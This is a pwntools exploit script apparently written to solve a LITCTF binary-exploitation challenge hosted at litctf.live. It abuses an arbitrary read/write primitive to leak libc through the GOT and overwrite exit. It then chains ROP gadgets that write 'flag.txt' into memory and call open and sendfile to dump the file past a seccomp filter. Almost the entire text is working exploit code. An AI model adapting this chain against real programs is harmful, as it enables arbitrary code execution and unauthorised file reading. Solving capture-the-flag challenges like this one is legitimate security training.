from pwn import *
from binascii import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
gs = '''
continue
'''

ret = p64(0x401016)
pop_rdi = p64(0x40143b)
pop_rsi = p64(0x401439)
puts_got = p64(e.got['puts'])
puts_plt = p64(e.plt['puts'])
main = p64(e.sym['main'])

ret2libc_chain = ret
ret2libc_chain += pop_rdi
ret2libc_chain += puts_got
ret2libc_chain += puts_plt
ret2libc_chain += main


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('litctf.live', 31790)
    else:
        return process(e.path)


p = start()


def www(r1, w1, w2, chain):
    p.recvuntil(b'From where?')
    p.sendline(b'%i' % (r1))
    p.recvuntil(b'there:\n')
    leak = p.recvline().strip(b'\n')
    info("Partial Leak: %s" % hex(int(leak.decode())))
    p.recvuntil(b'To where?')
    p.sendline(b'%i' % (w1))
    p.recvuntil(b'What?')
    p.sendline(b'%i' % (w2))
    p.recvuntil(b'Was this a good challenge?')
    p.sendline(chain)


def leak_libc():
    ''' leak libc base address '''
    www((e.got['puts']+2), e.got['exit'],
        e.sym['seccomp_init'], ret2libc_chain)
    p.recvuntil(b'You said:')
    p.recvline()
    p.recvline()
    leak = u64(p.recv(6)+b'\x00\x00')
    info("Full Leak: %s" % hex(leak))
    libc.address = leak-libc.sym['puts']
    info("Libc Base: %s" % hex(libc.address))


def write_flag():
    '''write flag.txt to 0x404068'''
    data = 0x404068+4
    flag = int(hexlify(b'txt.'), 16)
    www((e.got['puts']+2), data, flag, main)
    data = 0x404068
    flag = int(hexlify(b'galf'), 16)
    www((e.got['puts']+2), data, flag, main)


def open_flag():
    ''' open('flag.txt', 0x0, 0x0) '''
    info("Open Flag")
    pause()
    chain = ret
    chain += pop_rdi                          # pop rdi; ret
    chain += p64(0x404068)                    # rdi=flag.txt
    chain += pop_rsi                          # pop rsi; pop r15; ret;
    chain += p64(0x0)                         # rsi=0x0
    chain += p64(0x0)                         # r15=0x0
    # pop rdx; xor eax, eax; pop rbp; pop r12; ret
    chain += p64(0xbfa9d + libc.address)
    chain += p64(0x0)                         # rdx = 0x0
    chain += p64(0x0)                         # rbp = 0x0
    chain += p64(0x0)                         # r12 = 0x0
    chain += ret
    chain += p64(libc.sym['open'])            # open('flag.txt',0,0)
    chain += main
    www((e.got['puts']+2), e.got['exit'], e.sym['seccomp_init'], chain)


def read_flag():
    info("Read Flag")
    ''' sendfile(1, 0x3 (fd), 0, 0x7fffffff '''
    chain = ret
    chain += pop_rdi                          # pop rdi; ret
    chain += p64(0x1)                         # rdi = 0x1
    chain += pop_rsi                          # pop rsi; pop r15; ret;
    chain += p64(0x3)                         # rsi = 0x3
    chain += p64(0x0)                         # r15 = 0x0
    # pop rdx; xor eax, eax; pop rbp; pop r12; ret
    chain += p64(0xbfa9d + libc.address)
    chain += p64(0x0)                         # rdx = 0x0
    chain += p64(0x0)                         # rbp = 0x0
    chain += p64(0x0)                         # r12 = 0x0
    chain += p64(0x45564 + libc.address)      # pop rcx; add eax, 0x17ae22; ret
    chain += p64(0x7fffffff)                  # rcx = 0x7fffffff
    chain += p64(libc.sym['sendfile'])        # sendfile(1,'rax',0,0x7fffffff)
    chain += main
    www((e.got['puts']+2), e.got['exit'], e.sym['seccomp_init'], chain)


leak_libc()
write_flag()
open_flag()
read_flag()
p.interactive()
